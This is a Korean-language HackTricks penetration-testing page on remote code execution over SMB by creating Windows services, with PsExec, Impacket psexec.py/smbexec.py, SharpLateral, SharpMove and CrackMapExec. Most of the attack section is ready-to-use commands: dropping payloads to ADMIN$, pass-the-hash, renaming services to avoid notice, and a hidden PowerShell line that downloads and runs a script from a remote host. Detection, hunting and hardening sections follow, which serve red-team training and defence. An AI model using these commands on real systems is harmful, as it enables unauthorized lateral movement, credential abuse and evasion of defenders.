# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## 작동 방식

이러한 technique은 SMB/RPC를 통해 원격으로 Windows Service Control Manager (SCM)를 악용하여 대상 호스트에서 command를 실행합니다. 일반적인 흐름은 다음과 같습니다.

1. 대상에 인증하고 SMB (TCP/445)를 통해 ADMIN$ share에 접근합니다.
2. executable을 복사하거나 service가 실행할 LOLBAS command line을 지정합니다.
3. 해당 command 또는 binary를 가리키도록 SCM (MS-SCMR over \PIPE\svcctl)을 통해 원격으로 service를 생성합니다.
4. service를 시작하여 payload를 실행하고, 선택적으로 named pipe를 통해 stdin/stdout을 캡처합니다.
5. service를 중지하고 정리합니다(service 및 drop된 binary를 삭제).

Requirements/prereqs:
- 대상의 Local Administrator (SeCreateServicePrivilege) 또는 대상에서 명시적인 service 생성 권한.
- SMB (445)에 연결 가능하고 ADMIN$ share를 사용할 수 있어야 하며, host firewall을 통해 Remote Service Management가 허용되어야 합니다.
- UAC Remote Restrictions: local account를 사용하는 경우 token filtering으로 인해 네트워크를 통한 admin 접근이 차단될 수 있습니다. 이 경우 기본 제공 Administrator를 사용하거나 LocalAccountTokenFilterPolicy=1을 설정해야 합니다.
- Kerberos vs NTLM: hostname/FQDN을 사용하면 Kerberos가 활성화되고, IP로 연결하면 대개 NTLM으로 fallback되며 hardened environment에서는 차단될 수 있습니다.

### sc.exe를 통한 수동 ScExec/WinExec

다음은 최소한의 service-creation 접근 방식을 보여줍니다. service image는 drop된 EXE이거나 cmd.exe 또는 powershell.exe와 같은 LOLBAS일 수 있습니다.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
참고:
- 서비스가 아닌 EXE를 시작할 때 timeout error가 발생할 수 있지만, 실행은 계속됩니다.
- OPSEC를 더 준수하려면 fileless command(`cmd /c`, `powershell -enc`)를 우선 사용하거나 dropped artifact를 삭제하세요.

더 자세한 단계는 다음에서 확인할 수 있습니다: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Tooling 및 예제

### Sysinternals PsExec.exe

- SMB를 사용해 ADMIN$에 PSEXESVC.exe를 drop하고, 임시 service(기본 이름 PSEXESVC)를 설치하며, named pipe를 통해 I/O를 proxy하는 classic admin tool입니다.
- 사용 예:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- WebDAV를 통해 Sysinternals Live에서 직접 실행할 수 있습니다:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- 서비스 설치/제거 이벤트를 남기며(Service name은 -r을 사용하지 않으면 보통 PSEXESVC) 실행 중 C:\Windows\PSEXESVC.exe를 생성합니다.

### Impacket psexec.py (PsExec-like)

- 임베디드 RemCom-like 서비스를 사용합니다. ADMIN$를 통해 임시 service binary(일반적으로 randomized name)를 드롭하고, service(기본값은 보통 RemComSvc)를 생성한 뒤 named pipe를 통해 I/O를 proxy합니다.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- C:\Windows\에 임시 EXE 생성(무작위 8자). Service name은 재정의하지 않으면 RemComSvc로 설정됩니다.

### Impacket smbexec.py (SMBExec)

- cmd.exe를 생성하고 I/O에 named pipe를 사용하는 임시 service를 생성합니다. 일반적으로 전체 EXE payload를 drop하지 않으며, command execution은 semi-interactive 방식입니다.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#)은 service-based exec를 포함한 여러 lateral movement 방법을 구현합니다.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove)에는 원격으로 명령을 실행하기 위한 서비스 수정/생성 기능이 포함되어 있습니다.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- CrackMapExec를 사용하여 서로 다른 backend(psexec/smbexec/wmiexec)를 통해 실행할 수도 있습니다:
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, 탐지 및 artifacts

PsExec 유사 technique 사용 시 일반적인 호스트/네트워크 artifacts:
- 사용된 admin account에 대해 대상에서 Security 4624 (Logon Type 3) 및 4672 (Special Privileges) 이벤트가 기록됩니다.
- Security 5140/5145 File Share 및 File Share Detailed 이벤트에 ADMIN$ access와 service binary(예: PSEXESVC.exe 또는 무작위 8자 .exe)의 create/write가 표시됩니다.
- 대상에서 Security 7045 Service Install 이벤트가 기록됩니다. service name은 PSEXESVC, RemComSvc 또는 custom name(-r / -service-name)일 수 있습니다.
- Sysmon 1 (Process Create)에서 services.exe 또는 service image가, 3 (Network Connect)에서 네트워크 연결이, 11 (File Create)에서 C:\Windows\ 내 파일 생성이 기록됩니다. 또한 17/18 (Pipe Created/Connected)에서 \\.\pipe\psexesvc, \\.\pipe\remcom_* 또는 randomized equivalent와 같은 pipe가 기록됩니다.
- Sysinternals EULA 관련 Registry artifact: operator host의 HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 (억제되지 않은 경우).

## Hunting 아이디어
- ImagePath에 cmd.exe /c, powershell.exe 또는 TEMP location이 포함된 service install에 alert를 설정합니다.
- ParentImage가 C:\Windows\PSEXESVC.exe인 process creation 또는 services.exe의 child로 실행되면서 LOCAL SYSTEM으로 shell을 실행하는 process를 확인합니다.
- -stdin/-stdout/-stderr로 끝나는 named pipe 또는 잘 알려진 PsExec clone pipe name을 flag합니다.

## 일반적인 failure troubleshooting
- Service 생성 시 Access is denied (5): 실제 local admin이 아니거나, local account에 대한 UAC remote restriction이 적용되었거나, EDR tampering protection이 service binary path를 차단하는 경우입니다.
- The network path was not found (53) 또는 ADMIN$에 연결할 수 없음: firewall이 SMB/RPC를 차단하거나 admin share가 비활성화된 경우입니다.
- Kerberos는 실패하지만 NTLM이 차단된 경우: hostname/FQDN(IP가 아님)으로 연결하고, 적절한 SPN을 확인하거나, Impacket 사용 시 ticket과 함께 -k/-no-pass를 제공합니다.
- Service start가 timeout되었지만 payload가 실행된 경우: 실제 service binary가 아니면 예상되는 동작입니다. output을 file에 capture하거나 live I/O에는 smbexec를 사용합니다.

## Hardening 참고 사항
- Windows 11 24H2 및 Windows Server 2025는 outbound 연결(Windows 11의 경우 inbound 연결도)에 대해 기본적으로 SMB signing을 요구합니다. 유효한 creds를 사용한 정상적인 PsExec 사용은 차단하지 않지만, unsigned SMB relay abuse를 방지하며 signing을 지원하지 않는 device에 영향을 줄 수 있습니다.<sup>[[2]](#references)</sup>
- 새로운 SMB client NTLM blocking(Windows 11 24H2/Server 2025)은 IP로 연결하거나 Kerberos를 사용하지 않는 server에 연결할 때 NTLM fallback을 방지할 수 있습니다. hardened environment에서는 NTLM 기반 PsExec/SMBExec가 작동하지 않으므로 Kerberos(hostname/FQDN)를 사용하거나, 정당한 필요가 있는 경우 exception을 구성합니다.<sup>[[2]](#references)</sup>
- Principle of least privilege: local admin membership을 최소화하고, Just-in-Time/Just-Enough Admin을 우선하며, LAPS를 적용하고, 7045 service install에 대한 monitoring/alert를 시행합니다.

## 함께 보기

- WMI 기반 remote exec(대체로 더 fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM 기반 remote exec:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
